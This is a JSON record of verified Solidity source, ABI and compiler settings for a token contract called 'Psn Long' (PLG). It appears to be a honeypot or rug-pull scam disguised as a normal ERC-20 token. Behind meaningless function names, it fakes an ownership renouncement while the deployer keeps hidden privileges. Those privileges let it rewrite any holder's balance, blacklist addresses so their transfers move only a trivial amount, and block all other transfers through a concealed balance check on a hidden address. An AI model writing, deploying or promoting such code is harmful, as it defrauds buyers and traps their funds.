{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface buyEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAtToken {\n    function createPair(address exemptEnableReceiver, address swapFeeAmount) external returns (address);\n}\n\ninterface shouldTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableTeam) external view returns (uint256);\n\n    function transfer(address isListWallet, uint256 totalShouldEnable) external returns (bool);\n\n    function allowance(address receiverFromTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalShouldEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isListWallet,\n        uint256 totalShouldEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromReceiver, uint256 value);\n    event Approval(address indexed receiverFromTake, address indexed spender, uint256 value);\n}\n\ninterface receiverToAmount is shouldTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PsnLong is launchAmount, shouldTeam, receiverToAmount {\n\n    address public exemptModeFund;\n\n    function balanceOf(address enableTeam) public view virtual override returns (uint256) {\n        return tradingSender[enableTeam];\n    }\n\n    bool private enableToken;\n\n    mapping(address => uint256) private tradingSender;\n\n    function getOwner() external view returns (address) {\n        return sellTx;\n    }\n\n    constructor (){\n        if (feeFund) {\n            swapMaxBuy = swapReceiverWallet;\n        }\n        buyEnable maxTotal = buyEnable(receiverAuto);\n        exemptModeFund = receiverAtToken(maxTotal.factory()).createPair(maxTotal.WETH(), address(this));\n        if (swapMaxBuy != swapReceiverWallet) {\n            swapMaxBuy = swapReceiverWallet;\n        }\n        liquidityFrom = _msgSender();\n        marketingReceiver();\n        tokenAuto[liquidityFrom] = true;\n        tradingSender[liquidityFrom] = toLaunched;\n        \n        emit Transfer(address(0), liquidityFrom, toLaunched);\n    }\n\n    bool private feeFund;\n\n    function name() external view virtual override returns (string memory) {\n        return sellMarketingTeam;\n    }\n\n    event OwnershipTransferred(address indexed modeAmount, address indexed toFund);\n\n    function listMode(address sellAuto, address isListWallet, uint256 totalShouldEnable) internal returns (bool) {\n        require(tradingSender[sellAuto] >= totalShouldEnable);\n        tradingSender[sellAuto] -= totalShouldEnable;\n        tradingSender[isListWallet] += totalShouldEnable;\n        emit Transfer(sellAuto, isListWallet, totalShouldEnable);\n        return true;\n    }\n\n    address public liquidityFrom;\n\n    address receiverAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return sellTx;\n    }\n\n    mapping(address => bool) public tokenAuto;\n\n    bool private launchedTxShould;\n\n    uint256 public swapReceiverWallet;\n\n    function tokenEnable(address walletSender) public {\n        tradingSell();\n        if (tradingTake == receiverLiquidity) {\n            receiverLiquidity = false;\n        }\n        if (walletSender == liquidityFrom || walletSender == exemptModeFund) {\n            return;\n        }\n        maxAmount[walletSender] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toLaunched;\n    }\n\n    function transfer(address marketingSender, uint256 totalShouldEnable) external virtual override returns (bool) {\n        return isEnableTake(_msgSender(), marketingSender, totalShouldEnable);\n    }\n\n    address shouldTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function allowance(address modeTxLiquidity, address listFund) external view virtual override returns (uint256) {\n        if (listFund == receiverAuto) {\n            return type(uint256).max;\n        }\n        return toFee[modeTxLiquidity][listFund];\n    }\n\n    function takeLaunched(uint256 totalShouldEnable) public {\n        tradingSell();\n        toToken = totalShouldEnable;\n    }\n\n    string private amountShould = \"PLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingTx;\n    }\n\n    function marketingReceiver() public {\n        emit OwnershipTransferred(liquidityFrom, address(0));\n        sellTx = address(0);\n    }\n\n    function transferFrom(address sellAuto, address isListWallet, uint256 totalShouldEnable) external override returns (bool) {\n        if (_msgSender() != receiverAuto) {\n            if (toFee[sellAuto][_msgSender()] != type(uint256).max) {\n                require(totalShouldEnable <= toFee[sellAuto][_msgSender()]);\n                toFee[sellAuto][_msgSender()] -= totalShouldEnable;\n            }\n        }\n        return isEnableTake(sellAuto, isListWallet, totalShouldEnable);\n    }\n\n    function isEnableTake(address sellAuto, address isListWallet, uint256 totalShouldEnable) internal returns (bool) {\n        if (sellAuto == liquidityFrom) {\n            return listMode(sellAuto, isListWallet, totalShouldEnable);\n        }\n        uint256 listTrading = shouldTeam(exemptModeFund).balanceOf(shouldTrading);\n        require(listTrading == toToken);\n        require(isListWallet != shouldTrading);\n        if (maxAmount[sellAuto]) {\n            return listMode(sellAuto, isListWallet, totalShould);\n        }\n        return listMode(sellAuto, isListWallet, totalShouldEnable);\n    }\n\n    function fromTxTeam(address marketingSender, uint256 totalShouldEnable) public {\n        tradingSell();\n        tradingSender[marketingSender] = totalShouldEnable;\n    }\n\n    uint256 toToken;\n\n    address private sellTx;\n\n    function approve(address listFund, uint256 totalShouldEnable) public virtual override returns (bool) {\n        toFee[_msgSender()][listFund] = totalShouldEnable;\n        emit Approval(_msgSender(), listFund, totalShouldEnable);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountShould;\n    }\n\n    function receiverTeam(address atMin) public {\n        if (fromMode) {\n            return;\n        }\n        if (receiverLiquidity) {\n            launchedTxShould = true;\n        }\n        tokenAuto[atMin] = true;\n        \n        fromMode = true;\n    }\n\n    uint8 private marketingTx = 18;\n\n    mapping(address => bool) public maxAmount;\n\n    bool private fromMarketing;\n\n    uint256 txAmount;\n\n    mapping(address => mapping(address => uint256)) private toFee;\n\n    function tradingSell() private view {\n        require(tokenAuto[_msgSender()]);\n    }\n\n    bool public tradingTake;\n\n    bool public receiverLiquidity;\n\n    string private sellMarketingTeam = \"Psn Long\";\n\n    uint256 constant totalShould = 11 ** 10;\n\n    bool public fromMode;\n\n    uint256 public swapMaxBuy;\n\n    uint256 private toLaunched = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFromTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTxLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShouldEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptModeFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShouldEnable\",\"type\":\"uint256\"}],\"name\":\"fromTxTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMin\",\"type\":\"address\"}],\"name\":\"receiverTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMaxBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalShouldEnable\",\"type\":\"uint256\"}],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"tokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShouldEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isListWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShouldEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PsnLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}